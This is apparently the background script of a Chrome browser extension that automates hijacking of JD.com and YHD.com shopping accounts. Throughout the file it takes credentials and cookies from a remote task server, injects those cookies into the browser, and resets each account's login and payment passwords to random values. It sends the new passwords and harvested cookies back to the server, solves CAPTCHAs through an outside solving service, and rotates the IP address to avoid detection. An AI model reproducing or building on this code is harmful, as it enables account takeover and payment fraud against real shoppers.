var last_watchdog_time = new Date().getTime();
var start_time = null;

var last_ip = null;
var api = null;
var task = {};
var ip_get_count = 0;
var boot_page = {
  jd: 'http://order.jd.com/center/list.action',
  yhd: 'http://my.yhd.com/order/myOrder.do'
};
var settings = {};
var reset = {
  account_id: null,
  password: null,
  pay_password: null
};

var watchdog_running = false;

messageListener();
reloadSettings(function(){
  console.log('reloadSettings finish');
});

function getTask(callback) {
  api.getTask(function(data) {
    console.log(data);
    if (data.success == 1) {
      chrome.storage.local.set({task: data.data}, function() {
        task = data.data;
        start_time = new Date().getTime();
        console.log(task);
        callback && callback();
      });
    } else {
      start_time = null;
      setTimeout(function(){
        last_watchdog_time = new Date().getTime();
        getTask(callback);
      }, 20000);
    }
  }, function() {
    console.log('接口请求失败');
    start_time = null;
    setTimeout(function(){changeIpAndOpenWindow()}, 30000);
  });
}

function changeIpAndOpenWindow() {
  last_watchdog_time = new Date().getTime();

  closeAllWindows(function() {
    setTimeout(function() {
      chrome.windows.create({
        url: 'adsl:adsl'
      }, function(window) {
        setTimeout(openWindow, 8000);
      });
    }, 1000);
  });
}

function openWindow() {

  last_watchdog_time = new Date().getTime();

  $.ajax({url: 'http://ipaddr.poptop.cc/remote_addr?'+new Date().getTime(), timeout: 3000}).done(function(data) {

    ip_get_count = 0;
    if (isValidIpv4Addr(data)) {
      if (data == last_ip) {
        console.log('当前IP和最后使用IP一样，重新执行更换IP');
        setTimeout(changeIpAndOpenWindow, 20000);
      } else {
        last_ip = data;
        getTask(function() {
          resetSettings(function(){
            closeAllWindows(function() {
              setTimeout(function() {
                //chrome.windows.create({
                //  url: boot_page[task.slug],
                //  incognito: true
                //});
                setCookies(function(){
                  setTimeout(function(){
                    chrome.tabs.create({url: boot_page[task.slug]}, function(){

                    });
                  },3000);
                });
              }, 10000);
            });
          });
        });
      }
    }

  }).fail(function(){
    if(ip_get_count > 3 ){
      setTimeout(function(){
        ip_get_count = 0;
        changeIpAndOpenWindow();
      },3000);
    }else{
        ip_get_count++;
        setTimeout(openWindow,10000);
    }
  });
}


function closeAllWindows(callback) {
  console.log('run closeAllWindows');

  chrome.windows.getAll(function(windows) {
		console.log('chrome.windows.getAll');
    var length = windows.length;
    var i = 0, index = 0;
    for(; i < length; i++) {
      if (windows[i].type === 'popup') {
        index++;
        if (index == length) {
          callback && callback();
        }
      }
      else {
        chrome.windows.remove(windows[i].id, function() {
          index++;
          if (index == length) {
            callback && callback();
          }
        });
      }
    }
  });
}

function messageListener(){
  chrome.runtime.onMessage.addListener(function(message, sender, sendResponse) {
    console.log('onMessage：',message);
    //console.log(sender);
    if (message.cmd === 'task_done') {
      if (settings.running) {
        changeIpAndOpenWindow();
      }
    }
    else if (message.cmd === 'start_task') {
      changeIpAndOpenWindow();
    }
    else if (message.cmd === 'watchdog') {
      last_watchdog_time = new Date().getTime();
      if(!watchdog_running){
        setTimeout(watchdog, 1000);
      }
    }
    else if (message.cmd === 'reload_settings') {
      reloadSettings(function(){
        if(!watchdog_running){
          setTimeout(watchdog, 1000);
        }
      });
    }
    else if(message.cmd === 'password'){
      console.log('密码修改成功');
      reportPassword(function(){
        chrome.tabs.sendMessage(sender.tab.id,{cmd:'password'});
      });
    }
    else if(message.cmd === 'pay_password'){
      console.log('支付密码修改成功');
      reportPayPassword();
    }
    else if(message.cmd === 'disable'){
      console.log('禁用账号，修改失败');
      reportDisable(message.message);
    }
    else if(message.cmd === 'cookies'){
      var domain = {jd:'jd.com', yhd:'yhd.com'};
      chrome.cookies.getAll({domain:domain[task.slug]},function(cookies){
        console.log(cookies);
        api.reportCookie(task.account_id,cookies,function(data){
          if(data.success){
            chrome.tabs.sendMessage(sender.tab.id,{cmd:'cookies'});
          }else{
            setTimeout(function(){
              window.location.reload(true);
            },10000);
          }
        },function(){
          setTimeout(function(){
            window.location.reload(true);
          },1000);
        });
      });
    }
    else if(message.cmd === 'autocode'){
      last_watchdog_time = new Date().getTime();
      setTimeout(function(){
        last_watchdog_time = new Date().getTime();
      },30000);
      var dama = new DaMa();
      dama.submitImgByBlob(message.img,function(cid,text){
        chrome.tabs.sendMessage(sender.tab.id,{cmd: 'autocode',cid: cid, code: text});
      },function(){
        chrome.tabs.reload(sender.tab.id);
      });
    }
    else if(message.cmd === 'verify_code'){
      last_watchdog_time = new Date().getTime();
      setTimeout(function(){
        last_watchdog_time = new Date().getTime();
      },30000);
      var dama = new DaMa();
      dama.submit(message.imgsrc,function(cid,text){
        chrome.tabs.sendMessage(sender.tab.id,{cmd: 'verify_code_result',cid: cid, text: text});
      },function(){
        chrome.tabs.reload(sender.tab.id);
      });

    }
    else if(message.cmd === 'verify_fail'){
      last_watchdog_time = new Date().getTime();
      console.log('verify_fail');
      var dama = new DaMa();
      dama.report(message.cid,function(){});

    }
    else if(message.cmd === 'reload'){
      last_watchdog_time = new Date().getTime();
      message.cmd = 'reloaded';
      console.log(retry);
      if(retry.retry){
        retry.retry ++;
        message.retry =  retry.retry;
      }else{
        message.retry = 1;
      }
      retry = message;
      console.log(retry);
      chrome.tabs.sendMessage(sender.tab.id,message);
    }
    else if(message.cmd === 'task'){
      chrome.storage.local.get(null, function(data) {
        task = data.task;
        chrome.tabs.sendMessage(sender.tab.id,{cmd:'task',task:task});
      });
    }
    else if(message.cmd === 'reset'){
      chrome.tabs.sendMessage(sender.tab.id,{cmd:'reset',reset:reset});
    }
    else if(message.cmd === 'settings'){
      if(settings){
        chrome.tabs.sendMessage(sender.tab.id,{cmd:'settings',settings:settings});
      }else{
        chrome.storage.local.get(null, function(data) {
          settings = data.settings;
          chrome.tabs.sendMessage(sender.tab.id,{cmd:'task',settings:settings});
        });
      }

    }

    sendResponse &&sendResponse();

  });
}

function reportPassword(callback){
  chrome.storage.local.get(null, function(data) {
    reset = data.reset;
    task = data.task;
    api.reportPassword(reset.account_id,reset.password,function(data){
      console.log(data);
      if(data.success == 1){
        task.password = reset.password;

        chrome.storage.local.set({task: task}, function() {
          console.log(task);
          callback && callback();
        });

      }else{
        last_watchdog_time = new Date().getTime();
        start_time = new Date().getTime();
        setTimeout(function(){
          last_watchdog_time = new Date().getTime();
          reportPassword(callback);
        },3000);
      }
    },function(){
      setTimeout(function(){
        last_watchdog_time = new Date().getTime();
        reportPassword(callback);
      },3000);
    });
  });
}

function reportPayPassword(){
  chrome.storage.local.get(null, function(data) {
    reset = data.reset;
    api.reportPayPassword(reset.account_id,reset.pay_password,function(data){
      console.log(data);
      if(data.success == 1){
        changeIpAndOpenWindow();
      }else{
        last_watchdog_time = new Date().getTime();
        start_time = new Date().getTime();
        setTimeout(function(){
          last_watchdog_time = new Date().getTime();
          reportPayPassword();
        },3000);
      }

    },function(){
      setTimeout(function(){
        last_watchdog_time = new Date().getTime();
        reportPayPassword();
      },3000);
    });
  });
}

function reportDisable(message){
  chrome.storage.local.get(null, function(data) {
    task = data.task;
    api.reportDisable(task.username,task.slug,message,function(){
      api.reportFail(task.account_id,message,function(){
        changeIpAndOpenWindow();
      }, function(){
        setTimeout(function(){
          last_watchdog_time = new Date().getTime();
          reportDisable(message);
        },3000);
      });
    },function(){
      setTimeout(function(){
        last_watchdog_time = new Date().getTime();
        reportDisable(message);
      },3000);
    });
  });
}



function setCookies(callback){
    chrome.windows.create({
      url: 'https://www.baidu.com/',
      incognito: true
    });
    var cookies = task.cookies;
    console.log(cookies);
    console.log("set cookies");
    if(cookies){
      var length = cookies.length;
      while(length--){
        var fullCookie = cookies[length];
        //seesion, hostOnly 值不支持设置,
        var newCookie = {};
        var host_only = fullCookie.hostOnly == "false" ? false : true;
        newCookie.url = "http" + ((fullCookie.secure) ? "s" : "") + "://" + fullCookie.domain + fullCookie.path;
        newCookie.name = fullCookie.name;
        newCookie.value = fullCookie.value;
        newCookie.path = fullCookie.path;
        newCookie.httpOnly = fullCookie.httpOnly == "false" ? false : true;
        newCookie.secure = fullCookie.secure == "false" ? false : true;
        if(!host_only){ newCookie.domain = fullCookie.domain; }
        if (fullCookie.session === "true" && newCookie.expirationDate) { newCookie.expirationDate = parseFloat(fullCookie.expirationDate); }
        console.log(newCookie);
        chrome.cookies.set(newCookie);
      }
    }
    console.log("set cookies success");
    callback && callback();
}

function watchdog() {
  watchdog_running = true;
  console.log("entrance watchdog");
  if (settings.running) {
    var time = new Date().getTime();
    console.log(parseInt((time - last_watchdog_time)/1000) +"秒");
    if (time - last_watchdog_time > 60000) {

      if(time - last_watchdog_time > 250000){
        console.log("250 seconds unactive");
        changeIpAndOpenWindow();
      }

      if(start_time){
        if(!task.slug){
          changeIpAndOpenWindow();
        }
      }

      if(start_time && (time - start_time > 600000)){
        changeIpAndOpenWindow();
      }

      chrome.tabs.query({active: true, highlighted: true}, function(tabs) {
        if (tabs.length > 0) {
          var current_url = tabs[0].url;
          console.log(current_url);
          if (current_url.indexOf('yhd.com/') >=0 || current_url.indexOf('jd.com/') >=0) {
            last_watchdog_time = time;
            if(!start_time){
              changeIpAndOpenWindow();
            }else{
              console.log("reload " + current_url);
              chrome.tabs.reload(tabs[0].id, function() {

              });
            }

          }

        }
      });

    }
  }

  setTimeout(watchdog, 1000);
}

function reloadSettings(success) {
  chrome.storage.local.get(null, function(data) {
    settings = data.settings ? data.settings : settings;
    console.log(settings);
    if(settings && settings.running){
      reset = data.reset ? data.reset : reset;
      api = new RemoteApi(settings);
      success && success();
    }
  });
}

function isValidIpv4Addr(ip) {
  return /^(?=\d+\.\d+\.\d+\.\d+$)(?:(?:25[0-9]|2[0-4][0-9]|1[0-9]{2}|[1-9][0-9]|[0-9])\.?){4}$/.test(ip);
}

function resetSettings(callback){
  if(reset.account_id == task.account_id && reset.password == task.password && reset.pay_password == task.pay_password){
    reportPayPassword();
  }else {
    if(reset.account_id != task.account_id){
      reset.account_id = task.account_id;

      if (reset.password != task.password) {
        reset.password = randPasswd();
      }

      if (reset.pay_password != task.pay_password) {
        reset.pay_password = randPasswd();
      }
    }

    chrome.storage.local.set({reset: reset}, function () {
      console.log(reset);
      callback && callback();
    });
  }
}

function randPasswd(){
  var str = '';
  for(var i=1;i<=8;i++)
  {
    var str_radom = 0;
    do{
      str_radom = Math.floor(Math.random() * 122) +65;
    }while(!((str_radom >= 65 && str_radom <= 90) || (str_radom >=97 && str_radom <= 122)));

    str += String.fromCharCode(str_radom);
  }
  var num = Math.ceil(Math.random() * 100);
  if(num<10){
    num = '0'+num;
  }
  str += num;

  return str;
}
